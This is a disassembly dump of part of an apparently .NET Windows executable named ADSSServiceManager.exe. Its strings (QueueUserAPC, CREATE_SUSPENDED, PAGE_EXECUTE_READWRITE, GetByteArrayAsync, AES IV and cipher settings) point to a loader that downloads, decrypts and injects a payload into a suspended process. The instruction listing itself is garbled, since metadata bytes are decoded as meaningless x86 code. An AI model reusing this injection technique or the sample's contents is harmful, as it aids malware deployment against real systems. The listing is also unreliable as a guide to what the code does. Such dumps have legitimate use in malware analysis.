  402b99:	00 02                	add    %al,(%edx)
  402b9b:	01 bb 00 0c 00 12    	add    %edi,0x12000c00(%ebx)
  402ba1:	07                   	pop    %es
  402ba2:	cc                   	int3
  402ba3:	00 c1                	add    %al,%cl
  402ba5:	00 b7 04 d1 00 e1    	add    %dh,-0x1eff2efc(%edi)
  402bab:	00 29                	add    %ch,(%ecx)
  402bad:	04 d5                	add    $0xd5,%al
  402baf:	00 99 00 11 01 db    	add    %bl,-0x24feef00(%ecx)
  402bb5:	00 14 00             	add    %dl,(%eax,%eax,1)
  402bb8:	12 07                	adc    (%edi),%al
  402bba:	cc                   	int3
  402bbb:	00 19                	add    %bl,(%ecx)
  402bbd:	01 5f 07             	add    %ebx,0x7(%edi)
  402bc0:	ee                   	out    %al,(%dx)
  402bc1:	00 19                	add    %bl,(%ecx)
  402bc3:	01 4b 06             	add    %ecx,0x6(%ebx)
  402bc6:	d5 00                	aad    $0x0
  402bc8:	a1 00 7a 01 d1       	mov    0xd1017a00,%eax
  402bcd:	00 c1                	add    %al,%cl
  402bcf:	00 f9                	add    %bh,%cl
  402bd1:	06                   	push   %es
  402bd2:	f3 00 21             	repz add %ah,(%ecx)
  402bd5:	01 b0 01 f9 00 31    	add    %esi,0x3100f901(%eax)
  402bdb:	01 fc                	add    %edi,%esp
  402bdd:	03 02                	add    (%edx),%eax
  402bdf:	01 39                	add    %edi,(%ecx)
  402be1:	01 41 05             	add    %eax,0x5(%ecx)
  402be4:	09 01                	or     %eax,(%ecx)
  402be6:	81 00 92 05 06 00    	addl   $0x60592,(%eax)
  402bec:	c1 00 9d             	roll   $0x9d,(%eax)
  402bef:	06                   	push   %es
  402bf0:	11 01                	adc    %eax,(%ecx)
  402bf2:	08 00                	or     %al,(%eax)
  402bf4:	04 00                	add    $0x0,%al
  402bf6:	28 01                	sub    %al,(%ecx)
  402bf8:	08 00                	or     %al,(%eax)
  402bfa:	08 00                	or     %al,(%eax)
  402bfc:	2d 01 09 00 0c       	sub    $0xc000901,%eax
  402c01:	00 32                	add    %dh,(%edx)
  402c03:	01 09                	add    %ecx,(%ecx)
  402c05:	00 10                	add    %dl,(%eax)
  402c07:	00 37                	add    %dh,(%edi)
  402c09:	01 09                	add    %ecx,(%ecx)
  402c0b:	00 14 00             	add    %dl,(%eax,%eax,1)
  402c0e:	3c 01                	cmp    $0x1,%al
  402c10:	2e 00 0b             	add    %cl,%cs:(%ebx)
  402c13:	00 9b 01 2e 00 13    	add    %bl,0x13002e01(%ebx)
  402c19:	00 a4 01 2e 00 1b 00 	add    %ah,0x1b002e(%ecx,%eax,1)
  402c20:	c3                   	ret
  402c21:	01 2e                	add    %ebp,(%esi)
  402c23:	00 23                	add    %ah,(%ebx)
  402c25:	00 cc                	add    %cl,%ah
  402c27:	01 2e                	add    %ebp,(%esi)
  402c29:	00 2b                	add    %ch,(%ebx)
  402c2b:	00 e4                	add    %ah,%ah
  402c2d:	01 2e                	add    %ebp,(%esi)
  402c2f:	00 33                	add    %dh,(%ebx)
  402c31:	00 e4                	add    %ah,%ah
  402c33:	01 2e                	add    %ebp,(%esi)
  402c35:	00 3b                	add    %bh,(%ebx)
  402c37:	00 e4                	add    %ah,%ah
  402c39:	01 2e                	add    %ebp,(%esi)
  402c3b:	00 43 00             	add    %al,0x0(%ebx)
  402c3e:	cc                   	int3
  402c3f:	01 2e                	add    %ebp,(%esi)
  402c41:	00 4b 00             	add    %cl,0x0(%ebx)
  402c44:	ea 01 2e 00 53 00 e4 	ljmp   $0xe400,$0x53002e01
  402c4b:	01 2e                	add    %ebp,(%esi)
  402c4d:	00 5b 00             	add    %bl,0x0(%ebx)
  402c50:	e4 01                	in     $0x1,%al
  402c52:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  402c56:	02 02                	add    (%edx),%al
  402c58:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  402c5c:	2c 02                	sub    $0x2,%al
  402c5e:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  402c62:	39 02                	cmp    %eax,(%edx)
  402c64:	63 00                	arpl   %eax,(%eax)
  402c66:	7b 00                	jnp    0x402c68
  402c68:	2d 01 1f 00 46       	sub    $0x46001f01,%eax
  402c6d:	00 76 00             	add    %dh,0x0(%esi)
  402c70:	0c 01                	or     $0x1,%al
  402c72:	88 04 c5 00 e6 00 44 	mov    %al,0x4400e600(,%eax,8)
  402c79:	01 03                	add    %eax,(%ebx)
  402c7b:	00 c3                	add    %al,%bl
  402c7d:	06                   	push   %es
  402c7e:	01 00                	add    %eax,(%eax)
  402c80:	40                   	inc    %eax
  402c81:	01 05 00 7a 07 01    	add    %eax,0x1077a00
  402c87:	00 40 01             	add    %al,0x1(%eax)
  402c8a:	07                   	pop    %es
  402c8b:	00 b6 07 01 00 00    	add    %dh,0x107(%esi)
  402c91:	01 09                	add    %ecx,(%ecx)
  402c93:	00 55 00             	add    %dl,0x0(%ebp)
  402c96:	01 00                	add    %eax,(%eax)
  402c98:	00 01                	add    %al,(%ecx)
  402c9a:	0b 00                	or     (%eax),%eax
  402c9c:	3a 01                	cmp    (%ecx),%al
  402c9e:	01 00                	add    %eax,(%eax)
  402ca0:	00 01                	add    %al,(%ecx)
  402ca2:	0d 00 a4 01 01       	or     $0x101a400,%eax
  402ca7:	00 04 80             	add    %al,(%eax,%eax,4)
  402caa:	00 00                	add    %al,(%eax)
  402cac:	01 00                	add    %eax,(%eax)
	...
  402cba:	6e                   	outsb  %ds:(%esi),(%dx)
  402cbb:	05 00 00 04 00       	add    $0x40000,%eax
	...
  402cc8:	00 00                	add    %al,(%eax)
  402cca:	16                   	push   %ss
  402ccb:	01 f9                	add    %edi,%ecx
  402ccd:	00 00                	add    %al,(%eax)
  402ccf:	00 00                	add    %al,(%eax)
  402cd1:	00 04 00             	add    %al,(%eax,%eax,1)
  402cd4:	02 00                	add    (%eax),%al
	...
  402cde:	1f                   	pop    %ds
  402cdf:	01 55 05             	add    %edx,0x5(%ebp)
  402ce2:	00 00                	add    %al,(%eax)
  402ce4:	00 00                	add    %al,(%eax)
  402ce6:	04 00                	add    $0x0,%al
  402ce8:	02 00                	add    (%eax),%al
  402cea:	05 00 02 00 00       	add    $0x200,%eax
  402cef:	00 00                	add    %al,(%eax)
  402cf1:	54                   	push   %esp
  402cf2:	61                   	popa
  402cf3:	73 6b                	jae    0x402d60
  402cf5:	60                   	pusha
  402cf6:	31 00                	xor    %eax,(%eax)
  402cf8:	49                   	dec    %ecx
  402cf9:	6e                   	outsb  %ds:(%esi),(%dx)
  402cfa:	74 33                	je     0x402d2f
  402cfc:	32 00                	xor    (%eax),%al
  402cfe:	63 62 52             	arpl   %esp,0x52(%edx)
  402d01:	65 73 65             	gs jae 0x402d69
  402d04:	72 76                	jb     0x402d7c
  402d06:	65 64 32 00          	gs xor %fs:(%eax),%al
  402d0a:	6c                   	insb   (%dx),%es:(%edi)
  402d0b:	70 52                	jo     0x402d5f
  402d0d:	65 73 65             	gs jae 0x402d75
  402d10:	72 76                	jb     0x402d88
  402d12:	65 64 32 00          	gs xor %fs:(%eax),%al
  402d16:	3c 4d                	cmp    $0x4d,%al
  402d18:	6f                   	outsl  %ds:(%esi),(%dx)
  402d19:	64 75 6c             	fs jne 0x402d88
  402d1c:	65 3e 00 3c 50       	gs add %bh,%ds:(%eax,%edx,2)
  402d21:	72 69                	jb     0x402d8c
  402d23:	76 61                	jbe    0x402d86
  402d25:	74 65                	je     0x402d8c
  402d27:	49                   	dec    %ecx
  402d28:	6d                   	insl   (%dx),%es:(%edi)
  402d29:	70 6c                	jo     0x402d97
  402d2b:	65 6d                	gs insl (%dx),%es:(%edi)
  402d2d:	65 6e                	outsb  %gs:(%esi),(%dx)
  402d2f:	74 61                	je     0x402d92
  402d31:	74 69                	je     0x402d9c
  402d33:	6f                   	outsl  %ds:(%esi),(%dx)
  402d34:	6e                   	outsb  %ds:(%esi),(%dx)
  402d35:	44                   	inc    %esp
  402d36:	65 74 61             	gs je  0x402d9a
  402d39:	69 6c 73 3e 00 70 66 	imul   $0x6e667000,0x3e(%ebx,%esi,2),%ebp
  402d40:	6e 
  402d41:	41                   	inc    %ecx
  402d42:	50                   	push   %eax
  402d43:	43                   	inc    %ebx
  402d44:	00 51 75             	add    %dl,0x75(%ecx)
  402d47:	65 75 65             	gs jne 0x402daf
  402d4a:	55                   	push   %ebp
  402d4b:	73 65                	jae    0x402db2
  402d4d:	72 41                	jb     0x402d90
  402d4f:	50                   	push   %eax
  402d50:	43                   	inc    %ebx
  402d51:	00 43 52             	add    %al,0x52(%ebx)
  402d54:	45                   	inc    %ebp
  402d55:	41                   	inc    %ecx
  402d56:	54                   	push   %esp
  402d57:	45                   	inc    %ebp
  402d58:	5f                   	pop    %edi
  402d59:	53                   	push   %ebx
  402d5a:	55                   	push   %ebp
  402d5b:	53                   	push   %ebx
  402d5c:	50                   	push   %eax
  402d5d:	45                   	inc    %ebp
  402d5e:	4e                   	dec    %esi
  402d5f:	44                   	inc    %esp
  402d60:	45                   	inc    %ebp
  402d61:	44                   	inc    %esp
  402d62:	00 50 41             	add    %dl,0x41(%eax)
  402d65:	47                   	inc    %edi
  402d66:	45                   	inc    %ebp
  402d67:	5f                   	pop    %edi
  402d68:	45                   	inc    %ebp
  402d69:	58                   	pop    %eax
  402d6a:	45                   	inc    %ebp
  402d6b:	43                   	inc    %ebx
  402d6c:	55                   	push   %ebp
  402d6d:	54                   	push   %esp
  402d6e:	45                   	inc    %ebp
  402d6f:	5f                   	pop    %edi
  402d70:	52                   	push   %edx
  402d71:	45                   	inc    %ebp
  402d72:	41                   	inc    %ecx
  402d73:	44                   	inc    %esp
  402d74:	57                   	push   %edi
  402d75:	52                   	push   %edx
  402d76:	49                   	dec    %ecx
  402d77:	54                   	push   %esp
  402d78:	45                   	inc    %ebp
  402d79:	00 4d 45             	add    %cl,0x45(%ebp)
  402d7c:	4d                   	dec    %ebp
  402d7d:	5f                   	pop    %edi
  402d7e:	52                   	push   %edx
  402d7f:	45                   	inc    %ebp
  402d80:	53                   	push   %ebx
  402d81:	45                   	inc    %ebp
  402d82:	52                   	push   %edx
  402d83:	56                   	push   %esi
  402d84:	45                   	inc    %ebp
  402d85:	00 50 52             	add    %dl,0x52(%eax)
  402d88:	4f                   	dec    %edi
  402d89:	43                   	inc    %ebx
  402d8a:	45                   	inc    %ebp
  402d8b:	53                   	push   %ebx
  402d8c:	53                   	push   %ebx
  402d8d:	5f                   	pop    %edi
  402d8e:	49                   	dec    %ecx
  402d8f:	4e                   	dec    %esi
  402d90:	46                   	inc    %esi
  402d91:	4f                   	dec    %edi
  402d92:	52                   	push   %edx
  402d93:	4d                   	dec    %ebp
  402d94:	41                   	inc    %ecx
  402d95:	54                   	push   %esp
  402d96:	49                   	dec    %ecx
  402d97:	4f                   	dec    %edi
  402d98:	4e                   	dec    %esi
  402d99:	00 53 54             	add    %dl,0x54(%ebx)
  402d9c:	41                   	inc    %ecx
  402d9d:	52                   	push   %edx
  402d9e:	54                   	push   %esp
  402d9f:	55                   	push   %ebp
  402da0:	50                   	push   %eax
  402da1:	49                   	dec    %ecx
  402da2:	4e                   	dec    %esi
  402da3:	46                   	inc    %esi
  402da4:	4f                   	dec    %edi
  402da5:	00 53 79             	add    %dl,0x79(%ebx)
  402da8:	73 74                	jae    0x402e1e
  402daa:	65 6d                	gs insl (%dx),%es:(%edi)
  402dac:	2e 49                	cs dec %ecx
  402dae:	4f                   	dec    %edi
  402daf:	00 4d 45             	add    %cl,0x45(%ebp)
  402db2:	4d                   	dec    %ebp
  402db3:	5f                   	pop    %edi
  402db4:	43                   	inc    %ebx
  402db5:	4f                   	dec    %edi
  402db6:	4d                   	dec    %ebp
  402db7:	4d                   	dec    %ebp
  402db8:	49                   	dec    %ecx
  402db9:	54                   	push   %esp
  402dba:	00 73 65             	add    %dh,0x65(%ebx)
  402dbd:	74 5f                	je     0x402e1e
  402dbf:	49                   	dec    %ecx
  402dc0:	56                   	push   %esi
  402dc1:	00 53 54             	add    %dl,0x54(%ebx)
  402dc4:	41                   	inc    %ecx
  402dc5:	52                   	push   %edx
  402dc6:	54                   	push   %esp
  402dc7:	46                   	inc    %esi
  402dc8:	5f                   	pop    %edi
  402dc9:	55                   	push   %ebp
  402dca:	53                   	push   %ebx
  402dcb:	45                   	inc    %ebp
  402dcc:	53                   	push   %ebx
  402dcd:	48                   	dec    %eax
  402dce:	4f                   	dec    %edi
  402dcf:	57                   	push   %edi
  402dd0:	57                   	push   %edi
  402dd1:	49                   	dec    %ecx
  402dd2:	4e                   	dec    %esi
  402dd3:	44                   	inc    %esp
  402dd4:	4f                   	dec    %edi
  402dd5:	57                   	push   %edi
  402dd6:	00 64 77 58          	add    %ah,0x58(%edi,%esi,2)
  402dda:	00 64 77 59          	add    %ah,0x59(%edi,%esi,2)
  402dde:	00 64 77 44          	add    %ah,0x44(%edi,%esi,2)
  402de2:	61                   	popa
  402de3:	74 61                	je     0x402e46
  402de5:	00 63 62             	add    %ah,0x62(%ebx)
  402de8:	00 6d 73             	add    %ch,0x73(%ebp)
  402deb:	63 6f 72             	arpl   %ebp,0x72(%edi)
  402dee:	6c                   	insb   (%dx),%es:(%edi)
  402def:	69 62 00 47 65 74 53 	imul   $0x53746547,0x0(%edx),%esp
  402df6:	74 72                	je     0x402e6a
  402df8:	69 6e 67 41 73 79 6e 	imul   $0x6e797341,0x67(%esi),%ebp
  402dff:	63 00                	arpl   %eax,(%eax)
  402e01:	47                   	inc    %edi
  402e02:	65 74 42             	gs je  0x402e47
  402e05:	79 74                	jns    0x402e7b
  402e07:	65 41                	gs inc %ecx
  402e09:	72 72                	jb     0x402e7d
  402e0b:	61                   	popa
  402e0c:	79 41                	jns    0x402e4f
  402e0e:	73 79                	jae    0x402e89
  402e10:	6e                   	outsb  %ds:(%esi),(%dx)
  402e11:	63 00                	arpl   %eax,(%eax)
  402e13:	64 77 54             	fs ja  0x402e6a
  402e16:	68 72 65 61 64       	push   $0x64616572
  402e1b:	49                   	dec    %ecx
  402e1c:	64 00 64 77 50       	add    %ah,%fs:0x50(%edi,%esi,2)
  402e21:	72 6f                	jb     0x402e92
  402e23:	63 65 73             	arpl   %esp,0x73(%ebp)
  402e26:	73 49                	jae    0x402e71
  402e28:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  402e2c:	73 75                	jae    0x402ea3
  402e2e:	6d                   	insl   (%dx),%es:(%edi)
  402e2f:	65 54                	gs push %esp
  402e31:	68 72 65 61 64       	push   $0x64616572
  402e36:	00 68 54             	add    %ch,0x54(%eax)
  402e39:	68 72 65 61 64       	push   $0x64616572
  402e3e:	00 6c 70 52          	add    %ch,0x52(%eax,%esi,2)
  402e42:	65 73 65             	gs jae 0x402eaa
  402e45:	72 76                	jb     0x402ebd
  402e47:	65 64 00 73 65       	gs add %dh,%fs:0x65(%ebx)
  402e4c:	74 5f                	je     0x402ead
  402e4e:	4d                   	dec    %ebp
  402e4f:	6f                   	outsl  %ds:(%esi),(%dx)
  402e50:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  402e55:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  402e5c:	64 65 
  402e5e:	00 43 69             	add    %al,0x69(%ebx)
  402e61:	70 68                	jo     0x402ecb
  402e63:	65 72 4d             	gs jb  0x402eb3
  402e66:	6f                   	outsl  %ds:(%esi),(%dx)
  402e67:	64 65 00 67 65       	fs add %ah,%gs:0x65(%edi)
  402e6c:	74 5f                	je     0x402ecd
  402e6e:	4d                   	dec    %ebp
  402e6f:	65 73 73             	gs jae 0x402ee5
  402e72:	61                   	popa
  402e73:	67 65 00 49 44       	add    %cl,%gs:0x44(%bx,%di)
  402e78:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  402e7f:	6c                   	insb   (%dx),%es:(%edi)
  402e80:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  402e84:	6e                   	outsb  %ds:(%esi),(%dx)
  402e85:	74 69                	je     0x402ef0
  402e87:	6d                   	insl   (%dx),%es:(%edi)
  402e88:	65 54                	gs push %esp
  402e8a:	79 70                	jns    0x402efc
  402e8c:	65 48                	gs dec %eax
  402e8e:	61                   	popa
  402e8f:	6e                   	outsb  %ds:(%esi),(%dx)
  402e90:	64 6c                	fs insb (%dx),%es:(%edi)
  402e92:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  402e96:	6f                   	outsl  %ds:(%esi),(%dx)
  402e97:	73 65                	jae    0x402efe
  402e99:	48                   	dec    %eax
  402e9a:	61                   	popa
  402e9b:	6e                   	outsb  %ds:(%esi),(%dx)
  402e9c:	64 6c                	fs insb (%dx),%es:(%edi)
  402e9e:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  402ea2:	74 54                	je     0x402ef8
  402ea4:	79 70                	jns    0x402f16
  402ea6:	65 46                	gs inc %esi
  402ea8:	72 6f                	jb     0x402f19
  402eaa:	6d                   	insl   (%dx),%es:(%edi)
  402eab:	48                   	dec    %eax
  402eac:	61                   	popa
  402ead:	6e                   	outsb  %ds:(%esi),(%dx)
  402eae:	64 6c                	fs insb (%dx),%es:(%edi)
  402eb0:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  402eb4:	6c                   	insb   (%dx),%es:(%edi)
  402eb5:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  402eb9:	6e                   	outsb  %ds:(%esi),(%dx)
  402eba:	73 6f                	jae    0x402f2b
  402ebc:	6c                   	insb   (%dx),%es:(%edi)
  402ebd:	65 00 6c 70 54       	add    %ch,%gs:0x54(%eax,%esi,2)
  402ec2:	69 74 6c 65 00 6c 70 	imul   $0x41706c00,0x65(%esp,%ebp,2),%esi
  402ec9:	41 
  402eca:	70 70                	jo     0x402f3c
  402ecc:	6c                   	insb   (%dx),%es:(%edi)
  402ecd:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  402ed4:	4e                   	dec    %esi
  402ed5:	61                   	popa
  402ed6:	6d                   	insl   (%dx),%es:(%edi)
  402ed7:	65 00 6c 70 43       	add    %ch,%gs:0x43(%eax,%esi,2)
  402edc:	6f                   	outsl  %ds:(%esi),(%dx)
  402edd:	6d                   	insl   (%dx),%es:(%edi)
  402ede:	6d                   	insl   (%dx),%es:(%edi)
  402edf:	61                   	popa
  402ee0:	6e                   	outsb  %ds:(%esi),(%dx)
  402ee1:	64 4c                	fs dec %esp
  402ee3:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  402eea:	74 65                	je     0x402f51
  402eec:	4c                   	dec    %esp
  402eed:	69 6e 65 00 56 61 6c 	imul   $0x6c615600,0x65(%esi),%ebp
  402ef4:	75 65                	jne    0x402f5b
  402ef6:	54                   	push   %esp
  402ef7:	79 70                	jns    0x402f69
  402ef9:	65 00 66 6c          	add    %ah,%gs:0x6c(%esi)
  402efd:	41                   	inc    %ecx
  402efe:	6c                   	insb   (%dx),%es:(%edi)
  402eff:	6c                   	insb   (%dx),%es:(%edi)
  402f00:	6f                   	outsl  %ds:(%esi),(%dx)
  402f01:	63 61 74             	arpl   %esp,0x74(%ecx)
  402f04:	69 6f 6e 54 79 70 65 	imul   $0x65707954,0x6e(%edi),%ebp
  402f0b:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  402f0f:	70 6f                	jo     0x402f80
  402f11:	73 65                	jae    0x402f78
  402f13:	00 50 61             	add    %dl,0x61(%eax)
  402f16:	72 73                	jb     0x402f8b
  402f18:	65 00 43 72          	add    %al,%gs:0x72(%ebx)
  402f1c:	65 61                	gs popa
  402f1e:	74 65                	je     0x402f85
  402f20:	00 43 6f             	add    %al,0x6f(%ebx)
  402f23:	6d                   	insl   (%dx),%es:(%edi)
  402f24:	70 69                	jo     0x402f8f
  402f26:	6c                   	insb   (%dx),%es:(%edi)
  402f27:	65 72 47             	gs jb  0x402f71
  402f2a:	65 6e                	outsb  %gs:(%esi),(%dx)
  402f2c:	65 72 61             	gs jb  0x402f90
  402f2f:	74 65                	je     0x402f96
  402f31:	64 41                	fs inc %ecx
  402f33:	74 74                	je     0x402fa9
  402f35:	72 69                	jb     0x402fa0
  402f37:	62 75 74             	bound  %esi,0x74(%ebp)
  402f3a:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  402f3e:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  402f45:	62 
  402f46:	75 74                	jne    0x402fbc
  402f48:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  402f4d:	75 67                	jne    0x402fb6
  402f4f:	67 61                	addr16 popa
  402f51:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  402f55:	74 74                	je     0x402fcb
  402f57:	72 69                	jb     0x402fc2
  402f59:	62 75 74             	bound  %esi,0x74(%ebp)
  402f5c:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  402f60:	6d                   	insl   (%dx),%es:(%edi)
  402f61:	56                   	push   %esi
  402f62:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  402f69:	74 74                	je     0x402fdf
  402f6b:	72 69                	jb     0x402fd6
  402f6d:	62 75 74             	bound  %esi,0x74(%ebp)
  402f70:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402f74:	73 65                	jae    0x402fdb
  402f76:	6d                   	insl   (%dx),%es:(%edi)
  402f77:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  402f7b:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  402f82:	72 
  402f83:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  402f8a:	73 73                	jae    0x402fff
  402f8c:	65 6d                	gs insl (%dx),%es:(%edi)
  402f8e:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  402f92:	72 61                	jb     0x402ff5
  402f94:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  402f97:	61                   	popa
  402f98:	72 6b                	jb     0x403005
  402f9a:	41                   	inc    %ecx
  402f9b:	74 74                	je     0x403011
  402f9d:	72 69                	jb     0x403008
  402f9f:	62 75 74             	bound  %esi,0x74(%ebp)
  402fa2:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  402fa7:	67 65 74 46          	addr16 gs je 0x402ff1
  402fab:	72 61                	jb     0x40300e
  402fad:	6d                   	insl   (%dx),%es:(%edi)
  402fae:	65 77 6f             	gs ja  0x403020
  402fb1:	72 6b                	jb     0x40301e
  402fb3:	41                   	inc    %ecx
  402fb4:	74 74                	je     0x40302a
  402fb6:	72 69                	jb     0x403021
  402fb8:	62 75 74             	bound  %esi,0x74(%ebp)
  402fbb:	65 00 64 77 46       	add    %ah,%gs:0x46(%edi,%esi,2)
  402fc0:	69 6c 6c 41 74 74 72 	imul   $0x69727474,0x41(%esp,%ebp,2),%ebp
  402fc7:	69 
  402fc8:	62 75 74             	bound  %esi,0x74(%ebp)
  402fcb:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402fcf:	73 65                	jae    0x403036
  402fd1:	6d                   	insl   (%dx),%es:(%edi)
  402fd2:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  402fd6:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  402fdd:	69 
  402fde:	6f                   	outsl  %ds:(%esi),(%dx)
  402fdf:	6e                   	outsb  %ds:(%esi),(%dx)
  402fe0:	41                   	inc    %ecx
  402fe1:	74 74                	je     0x403057
  402fe3:	72 69                	jb     0x40304e
  402fe5:	62 75 74             	bound  %esi,0x74(%ebp)
  402fe8:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402fec:	73 65                	jae    0x403053
  402fee:	6d                   	insl   (%dx),%es:(%edi)
  402fef:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402ff3:	6f                   	outsl  %ds:(%esi),(%dx)
  402ff4:	6e                   	outsb  %ds:(%esi),(%dx)
  402ff5:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  402ffb:	74 69                	je     0x403066
  402ffd:	6f                   	outsl  %ds:(%esi),(%dx)
  402ffe:	6e                   	outsb  %ds:(%esi),(%dx)
  402fff:	41                   	inc    %ecx
  403000:	74 74                	je     0x403076
  403002:	72 69                	jb     0x40306d
  403004:	62 75 74             	bound  %esi,0x74(%ebp)
  403007:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40300b:	73 65                	jae    0x403072
  40300d:	6d                   	insl   (%dx),%es:(%edi)
  40300e:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  403012:	65 73 63             	gs jae 0x403078
  403015:	72 69                	jb     0x403080
  403017:	70 74                	jo     0x40308d
  403019:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  403020:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  403027:	6f                   	outsl  %ds:(%esi),(%dx)
  403028:	6d                   	insl   (%dx),%es:(%edi)
  403029:	70 69                	jo     0x403094
  40302b:	6c                   	insb   (%dx),%es:(%edi)
  40302c:	61                   	popa
  40302d:	74 69                	je     0x403098
  40302f:	6f                   	outsl  %ds:(%esi),(%dx)
  403030:	6e                   	outsb  %ds:(%esi),(%dx)
  403031:	52                   	push   %edx
  403032:	65 6c                	gs insb (%dx),%es:(%edi)
  403034:	61                   	popa
  403035:	78 61                	js     0x403098
  403037:	74 69                	je     0x4030a2
  403039:	6f                   	outsl  %ds:(%esi),(%dx)
  40303a:	6e                   	outsb  %ds:(%esi),(%dx)
  40303b:	73 41                	jae    0x40307e
  40303d:	74 74                	je     0x4030b3
  40303f:	72 69                	jb     0x4030aa
  403041:	62 75 74             	bound  %esi,0x74(%ebp)
  403044:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  403048:	73 65                	jae    0x4030af
  40304a:	6d                   	insl   (%dx),%es:(%edi)
  40304b:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40304f:	72 6f                	jb     0x4030c0
  403051:	64 75 63             	fs jne 0x4030b7
  403054:	74 41                	je     0x403097
  403056:	74 74                	je     0x4030cc
  403058:	72 69                	jb     0x4030c3
  40305a:	62 75 74             	bound  %esi,0x74(%ebp)
  40305d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  403061:	73 65                	jae    0x4030c8
  403063:	6d                   	insl   (%dx),%es:(%edi)
  403064:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  403068:	6f                   	outsl  %ds:(%esi),(%dx)
  403069:	70 79                	jo     0x4030e4
  40306b:	72 69                	jb     0x4030d6
  40306d:	67 68 74 41 74 74    	addr16 push $0x74744174
  403073:	72 69                	jb     0x4030de
  403075:	62 75 74             	bound  %esi,0x74(%ebp)
  403078:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40307c:	73 65                	jae    0x4030e3
  40307e:	6d                   	insl   (%dx),%es:(%edi)
  40307f:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  403083:	6f                   	outsl  %ds:(%esi),(%dx)
  403084:	6d                   	insl   (%dx),%es:(%edi)
  403085:	70 61                	jo     0x4030e8
  403087:	6e                   	outsb  %ds:(%esi),(%dx)
  403088:	79 41                	jns    0x4030cb
  40308a:	74 74                	je     0x403100
  40308c:	72 69                	jb     0x4030f7
  40308e:	62 75 74             	bound  %esi,0x74(%ebp)
  403091:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  403095:	6e                   	outsb  %ds:(%esi),(%dx)
  403096:	74 69                	je     0x403101
  403098:	6d                   	insl   (%dx),%es:(%edi)
  403099:	65 43                	gs inc %ebx
  40309b:	6f                   	outsl  %ds:(%esi),(%dx)
  40309c:	6d                   	insl   (%dx),%es:(%edi)
  40309d:	70 61                	jo     0x403100
  40309f:	74 69                	je     0x40310a
  4030a1:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4030a4:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4030ab:	69 
  4030ac:	62 75 74             	bound  %esi,0x74(%ebp)
  4030af:	65 00 54 6f 42       	add    %dl,%gs:0x42(%edi,%ebp,2)
  4030b4:	79 74                	jns    0x40312a
  4030b6:	65 00 41 44          	add    %al,%gs:0x44(%ecx)
  4030ba:	53                   	push   %ebx
  4030bb:	53                   	push   %ebx
  4030bc:	53                   	push   %ebx
  4030bd:	65 72 76             	gs jb  0x403136
  4030c0:	69 63 65 4d 61 6e 61 	imul   $0x616e614d,0x65(%ebx),%esp
  4030c7:	67 65 72 2e          	addr16 gs jb 0x4030f9
  4030cb:	65 78 65             	gs js  0x403133
  4030ce:	00 64 77 58          	add    %ah,0x58(%edi,%esi,2)
  4030d2:	53                   	push   %ebx
  4030d3:	69 7a 65 00 64 77 59 	imul   $0x59776400,0x65(%edx),%edi
  4030da:	53                   	push   %ebx
  4030db:	69 7a 65 00 6e 53 69 	imul   $0x69536e00,0x65(%edx),%edi
  4030e2:	7a 65                	jp     0x403149
  4030e4:	00 64 77 53          	add    %ah,0x53(%edi,%esi,2)
  4030e8:	69 7a 65 00 53 69 7a 	imul   $0x7a695300,0x65(%edx),%edi
  4030ef:	65 4f                	gs dec %edi
  4030f1:	66 00 73 65          	data16 add %dh,0x65(%ebx)
  4030f5:	74 5f                	je     0x403156
  4030f7:	50                   	push   %eax
  4030f8:	61                   	popa
  4030f9:	64 64 69 6e 67 00 53 	fs imul $0x73795300,%fs:0x67(%esi),%ebp
  403100:	79 73 
  403102:	74 65                	je     0x403169
